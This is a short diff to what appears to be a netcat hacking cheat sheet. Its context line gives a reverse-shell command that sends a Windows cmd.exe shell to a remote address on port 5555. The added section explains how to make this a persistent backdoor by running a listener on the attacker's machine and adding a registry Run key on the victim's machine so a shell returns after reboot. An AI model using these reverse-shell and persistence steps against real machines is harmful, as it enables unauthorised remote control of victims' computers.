@@ -75,3 +75,13 @@ nc.exe -e cmd.exe 192.168.0.1 5555
 
 #### Creating Persistent Backdoor With Netcat
 
+* Attacker needs to edit the victims registry so even when victim closes his system upon reboot attacker will be able to get a shell.
+```
+nc -l -v -p 5555 >> In attackers machine
+Open "regedit" in victims machine and navigate to "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"  and add new registry.
+```
+![Screenshot at 2022-12-25 13-02-21](https://user-images.githubusercontent.com/85208639/209460090-697c3ba2-0758-40d1-b79a-c56f7a05ab75.png)
+```
+
+```
+
